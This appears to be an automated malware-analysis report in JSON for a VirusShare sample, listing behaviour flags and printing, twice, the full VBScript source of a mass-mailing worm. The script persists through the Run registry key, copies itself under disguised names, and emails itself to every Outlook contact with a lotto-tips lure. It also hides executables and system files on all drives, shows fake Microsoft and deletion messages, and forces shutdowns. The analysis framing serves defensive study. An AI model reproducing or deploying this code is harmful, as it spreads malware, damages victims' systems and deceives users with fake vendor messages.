{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "CopyFile": "May copy a file",
            "CreateObject": "May create an OLE object",
            "CreateTextFile": "May create a text file",
            "RegRead": "May read registry keys",
            "Run": "May run an executable file or a system command",
            "Shell": "May run an executable file or a system command",
            "WScript.Shell": "May run an executable file or a system command",
            "Windows": "May enumerate application windows",
            "system": "May run an executable file or a system command on a Mac"
        },
        "macro": "On Error Resume Next\nSet CHECKREG = CreateObject(\"WScript.Shell\")\nIf CHECKREG.RegRead(\"HKLM\\SOFTWARE\\NyHx\\Start_NyHx\") <> 1 Then\nSet NEWREG = CreateObject(\"WScript.Shell\")\nNEWREG.RegWrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\uBeenHoaxd\",\"C:\\WINDOWS\\System32\\Top 10 Lotto Tips.doc.vbs\"\nSet COPYREG = CreateObject(\"Scripting.FileSystemObject\")\nCOPYREG.CopyFile WScript.ScriptFullName, \"C:\\Program Files\\WindowsUpdate\\IEUpdate.xml.vbs\"\n\nSet HIDEVBS = CreateObject(\"Scripting.FileSystemObject\")\nConst ATTRIB1 = 34\nSet VBSHIDDEN = HIDEVBS.GetFile(\"C:\\Program Files\\WindowsUpdate\\IEUpdate.xml.vbs\")\nVBSHIDDEN.Attributes = ATTRIB1\n\nSet NEWBATCH = CreateObject(\"Scripting.FileSystemObject\")\nSet BATCH1 = NEWBATCH.CreateTextFile(\"C:\\WINDOWS\\system32\\MSXPS.bat\")\nBATCH1.WriteLine \"CLS\"\nBATCH1.WriteLine \"@ECHO OFF\"\nBATCH1.WriteLine \"SHUTDOWN -s -t 30 -c \"\"System_Error:    Microsoft Xp has encounted some serious errors or has lost some important files, Your system will shutdown in (30) seconds if you choose to restart you may need to reinstall some files.!\"&\"\"\"\"\nBATCH1.WriteLine \"CLS\"\nBATCH1.Close\n\nSet HIDEBATCH1 = CreateObject(\"Scripting.FileSystemObject\")\nConst ATTRIB2 = 34\nSet BATCH1HIDDEN = HIDEBATCH1.GetFile(\"C:\\WINDOWS\\system32\\MSXPS.bat\")\nBATCH1HIDDEN.Attributes = ATTRIB2\n\nOn Error Resume Next \nSet FSO = CreateObject (\"Scripting.FileSystemObject\") \nSet OUTLOOKAPP = CreateObject (\"Outlook.Application\") \nSet ENTRYCOUNT = WScript.CreateObject (\"Outlook.Application\")\nSet MAPISPACE = ENTRYCOUNT.GetNameSpace (\"MAPI\") \nSet VICTIMSADDRESS = MAPISPACE.AddressLists (1) \nFor RELOOP = 1 To VICTIMSADDRESS.AddressEntries.Count \nSet SPAMMAIL = OUTLOOKAPP.CreateItem (0) \nSPAMMAIL.To = OUTLOOKAPP.GetNameSpace(\"MAPI\").AddressLists(1).AddressEntries(RELOOP) \nSPAMMAIL.Subject = \"Re: Top 10 ways to select your winning lotto numbers..!\" \nSPAMMAIL.Body = \"Please read the document that is attached to this email for the top 10 tips..!\" & vbCrLf & \"I made $1500 2 days after reading the document, I was so amazed...!\"\nSPAMMAIL.Attachments.Add Wscript.ScriptFullName\nSPAMMAIL.DeleteAfterSubmit = True\nSPAMMAIL.Send \nNext \nOUTLOOKAPP.Quit\n\nElse\nIf CHECKREG.RegRead (\"HKLM\\SOFTWARE\\NyHx\\Start_NyHx\") = 1 then\nNASTYHOAXMSG()\nEnd If\nEnd If\n\nSet NEWREG = CreateObject(\"WScript.Shell\") \nNEWREG.RegWrite \"HKLM\\SOFTWARE\\NyHx\\Start_NyHx\", 1, \"REG_DWORD\" \nSet FSO = CreateObject(\"Scripting.FileSystemObject\")\nSet DRIVES = FSO.DRIVES\nFor Each DRIVE In DRIVES\nIf Drive.DriveType = 2 Or Drive.DriveType = 3 Then\nHIDEFILES (DRIVE)\nEnd If\nNext\n\nFunction HIDEFILES(PATH)\nSet FSO = CreateObject(\"Scripting.FileSystemObject\")\nSet FOLDER = FSO.GetFolder(PATH)\nSet FILES = FOLDER.FILES\nFor Each FILE In FILES\nSEARCHEXTNAME = FSO.GetExtensionName(FILE.PATH)\nIf (SEARCHEXTNAME = \"exe\") Or (SEARCHEXTNAME = \"dll\") Or (SEARCHEXTNAME = \"log\") Or (SEARCHEXTNAME = \"ini\") Or (SEARCHEXTNAME = \"INI\") Then\nSet FILEATTRIB = FSO.GetFile(FILE.PATH)\nFILEATTRIB.Attributes = 34\nMsgBox \"Now Deleting File :\" & vbCrLf & vbCrLf & FILE.PATH, 16, \"Critical System Error :\"\nEnd If\nNext\nSet SUBFOLDERS = FOLDER.SUBFOLDERS\nFor Each SUBFOLDER In SUBFOLDERS\nHIDEFILES SUBFOLDER.PATH\nNext\nSet XX = CreateObject(\"WScript.Shell\")\nXX.Run \"C:\\WINDOWS\\system32\\MSXPS.bat\"\nEnd Function\n\nSub NASTYHOAXMSG()\nSet DELETEBATCH = CreateObject(\"Scripting.FileSystemObject\")\nDELETEBATCH.DeleteFile(\"C:\\WINDOWS\\system32\\MSXPS.bat\")\nSet RENEWBATCH = CreateObject(\"Scripting.FileSystemObject\")\nSet BATCH2 = RENEWBATCH.CreateTextFile(\"C:\\WINDOWS\\system32\\MSXPS.bat\")\nBATCH2.WriteLine \"CLS\"\nBATCH2.WriteLine \"@ECHO OFF\"\nBATCH2.WriteLine \"SHUTDOWN -s -t 30 -c \"\"System_Infection:    YOUR SYSTEM HAS BEEN INFECTED WITH THE ~ VBS.Na$tyHo@x.worm.A ~ VIRUS..!! \"&\"\"\"\"\nBATCH2.WriteLine \"CLS\"\nBATCH2.Close\n\nMSGNASTYHOAX = \"Microsoft is giving you a reminder to update all your software\" & vbCrLf\nMSGNASTYHOAX = MSGNASTYHOAX & \" This means please pay most attention to :\" & vbCrLf & vbCrLf\nMSGNASTYHOAX = MSGNASTYHOAX & \"  - Microsoft Windows sofware updates\" & vbCrLf\nMSGNASTYHOAX = MSGNASTYHOAX & \"  - anti-virus software updates\" & vbCrLf\nMSGNASTYHOAX = MSGNASTYHOAX & \"  - Other software updates that you may have on your computer\" & vbCrLf & vbCrLf\nMSGNASTYHOAX = MSGNASTYHOAX & \"This is the most sufficiant way to keep out THESE nasty viruses & intruders..!!\"\nMsgBox MSGNASTYHOAX, 64, \"Microsoft Update Reminder\"\n\nSet HIDEBATCH2 = CreateObject(\"Scripting.FileSystemObject\")\nConst ATTRIB3 = 34\nSet BATCH1HIDDEN = HIDEBATCH2.GetFile(\"C:\\WINDOWS\\system32\\MSXPS.bat\")\nBATCH1HIDDEN.Attributes = ATTRIB3\nSet XX = CreateObject(\"WScript.Shell\")\nXX.Run \"C:\\WINDOWS\\system32\\MSXPS.bat\"\nEnd Sub "
    },
    "filename": "VirusShare_ef314983f99a9e1cb350986f41f9acd9",
    "filesize": 4728,
    "filetype": "ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "ef314983f99a9e1cb350986f41f9acd9",
        "sha1": "68edd78f6b8ebe458a1c6142088cbe59e252371b",
        "sha256": "be086c6f92b6aa5562955adee6e4b1ba3d1e2d18e5a4149243c0c0a223700a4a"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "On Error Resume Next",
            "Set CHECKREG = CreateObject(\"WScript.Shell\")",
            "If CHECKREG.RegRead(\"HKLM\\SOFTWARE\\NyHx\\Start_NyHx\") <> 1 Then",
            "Set NEWREG = CreateObject(\"WScript.Shell\")",
            "NEWREG.RegWrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\uBeenHoaxd\",\"C:\\WINDOWS\\System32\\Top 10 Lotto Tips.doc.vbs\"",
            "Set COPYREG = CreateObject(\"Scripting.FileSystemObject\")",
            "COPYREG.CopyFile WScript.ScriptFullName, \"C:\\Program Files\\WindowsUpdate\\IEUpdate.xml.vbs\"",
            "Set HIDEVBS = CreateObject(\"Scripting.FileSystemObject\")",
            "Const ATTRIB1 = 34",
            "Set VBSHIDDEN = HIDEVBS.GetFile(\"C:\\Program Files\\WindowsUpdate\\IEUpdate.xml.vbs\")",
            "VBSHIDDEN.Attributes = ATTRIB1",
            "Set NEWBATCH = CreateObject(\"Scripting.FileSystemObject\")",
            "Set BATCH1 = NEWBATCH.CreateTextFile(\"C:\\WINDOWS\\system32\\MSXPS.bat\")",
            "BATCH1.WriteLine \"CLS\"",
            "BATCH1.WriteLine \"@ECHO OFF\"",
            "BATCH1.WriteLine \"SHUTDOWN -s -t 30 -c \"\"System_Error:    Microsoft Xp has encounted some serious errors or has lost some important files, Your system will shutdown in (30) seconds if you choose to restart you may need to reinstall some files.!\"&\"\"\"\"",
            "BATCH1.WriteLine \"CLS\"",
            "BATCH1.Close",
            "Set HIDEBATCH1 = CreateObject(\"Scripting.FileSystemObject\")",
            "Const ATTRIB2 = 34",
            "Set BATCH1HIDDEN = HIDEBATCH1.GetFile(\"C:\\WINDOWS\\system32\\MSXPS.bat\")",
            "BATCH1HIDDEN.Attributes = ATTRIB2",
            "On Error Resume Next ",
            "Set FSO = CreateObject (\"Scripting.FileSystemObject\") ",
            "Set OUTLOOKAPP = CreateObject (\"Outlook.Application\") ",
            "Set ENTRYCOUNT = WScript.CreateObject (\"Outlook.Application\")",
            "Set MAPISPACE = ENTRYCOUNT.GetNameSpace (\"MAPI\") ",
            "Set VICTIMSADDRESS = MAPISPACE.AddressLists (1) ",
            "For RELOOP = 1 To VICTIMSADDRESS.AddressEntries.Count ",
            "Set SPAMMAIL = OUTLOOKAPP.CreateItem (0) ",
            "SPAMMAIL.To = OUTLOOKAPP.GetNameSpace(\"MAPI\").AddressLists(1).AddressEntries(RELOOP) ",
            "SPAMMAIL.Subject = \"Re: Top 10 ways to select your winning lotto numbers..!\" ",
            "SPAMMAIL.Body = \"Please read the document that is attached to this email for the top 10 tips..!\" & vbCrLf & \"I made $1500 2 days after reading the document, I was so amazed...!\"",
            "SPAMMAIL.Attachments.Add Wscript.ScriptFullName",
            "SPAMMAIL.DeleteAfterSubmit = True",
            "SPAMMAIL.Send ",
            "Next ",
            "OUTLOOKAPP.Quit",
            "Else",
            "If CHECKREG.RegRead (\"HKLM\\SOFTWARE\\NyHx\\Start_NyHx\") = 1 then",
            "NASTYHOAXMSG()",
            "End If",
            "End If",
            "Set NEWREG = CreateObject(\"WScript.Shell\") ",
            "NEWREG.RegWrite \"HKLM\\SOFTWARE\\NyHx\\Start_NyHx\", 1, \"REG_DWORD\" ",
            "Set FSO = CreateObject(\"Scripting.FileSystemObject\")",
            "Set DRIVES = FSO.DRIVES",
            "For Each DRIVE In DRIVES",
            "If Drive.DriveType = 2 Or Drive.DriveType = 3 Then",
            "HIDEFILES (DRIVE)",
            "End If",
            "Next",
            "Function HIDEFILES(PATH)",
            "Set FSO = CreateObject(\"Scripting.FileSystemObject\")",
            "Set FOLDER = FSO.GetFolder(PATH)",
            "Set FILES = FOLDER.FILES",
            "For Each FILE In FILES",
            "SEARCHEXTNAME = FSO.GetExtensionName(FILE.PATH)",
            "If (SEARCHEXTNAME = \"exe\") Or (SEARCHEXTNAME = \"dll\") Or (SEARCHEXTNAME = \"log\") Or (SEARCHEXTNAME = \"ini\") Or (SEARCHEXTNAME = \"INI\") Then",
            "Set FILEATTRIB = FSO.GetFile(FILE.PATH)",
            "FILEATTRIB.Attributes = 34",
            "MsgBox \"Now Deleting File :\" & vbCrLf & vbCrLf & FILE.PATH, 16, \"Critical System Error :\"",
            "End If",
            "Next",
            "Set SUBFOLDERS = FOLDER.SUBFOLDERS",
            "For Each SUBFOLDER In SUBFOLDERS",
            "HIDEFILES SUBFOLDER.PATH",
            "Next",
            "Set XX = CreateObject(\"WScript.Shell\")",
            "XX.Run \"C:\\WINDOWS\\system32\\MSXPS.bat\"",
            "End Function",
            "Sub NASTYHOAXMSG()",
            "Set DELETEBATCH = CreateObject(\"Scripting.FileSystemObject\")",
            "DELETEBATCH.DeleteFile(\"C:\\WINDOWS\\system32\\MSXPS.bat\")",
            "Set RENEWBATCH = CreateObject(\"Scripting.FileSystemObject\")",
            "Set BATCH2 = RENEWBATCH.CreateTextFile(\"C:\\WINDOWS\\system32\\MSXPS.bat\")",
            "BATCH2.WriteLine \"CLS\"",
            "BATCH2.WriteLine \"@ECHO OFF\"",
            "BATCH2.WriteLine \"SHUTDOWN -s -t 30 -c \"\"System_Infection:    YOUR SYSTEM HAS BEEN INFECTED WITH THE ~ VBS.Na$tyHo@x.worm.A ~ VIRUS..!! \"&\"\"\"\"",
            "BATCH2.WriteLine \"CLS\"",
            "BATCH2.Close",
            "MSGNASTYHOAX = \"Microsoft is giving you a reminder to update all your software\" & vbCrLf",
            "MSGNASTYHOAX = MSGNASTYHOAX & \" This means please pay most attention to :\" & vbCrLf & vbCrLf",
            "MSGNASTYHOAX = MSGNASTYHOAX & \"  - Microsoft Windows sofware updates\" & vbCrLf",
            "MSGNASTYHOAX = MSGNASTYHOAX & \"  - anti-virus software updates\" & vbCrLf",
            "MSGNASTYHOAX = MSGNASTYHOAX & \"  - Other software updates that you may have on your computer\" & vbCrLf & vbCrLf",
            "MSGNASTYHOAX = MSGNASTYHOAX & \"This is the most sufficiant way to keep out THESE nasty viruses & intruders..!!\"",
            "MsgBox MSGNASTYHOAX, 64, \"Microsoft Update Reminder\"",
            "Set HIDEBATCH2 = CreateObject(\"Scripting.FileSystemObject\")",
            "Const ATTRIB3 = 34",
            "Set BATCH1HIDDEN = HIDEBATCH2.GetFile(\"C:\\WINDOWS\\system32\\MSXPS.bat\")",
            "BATCH1HIDDEN.Attributes = ATTRIB3",
            "Set XX = CreateObject(\"WScript.Shell\")",
            "XX.Run \"C:\\WINDOWS\\system32\\MSXPS.bat\"",
            "End Sub "
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.312590",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
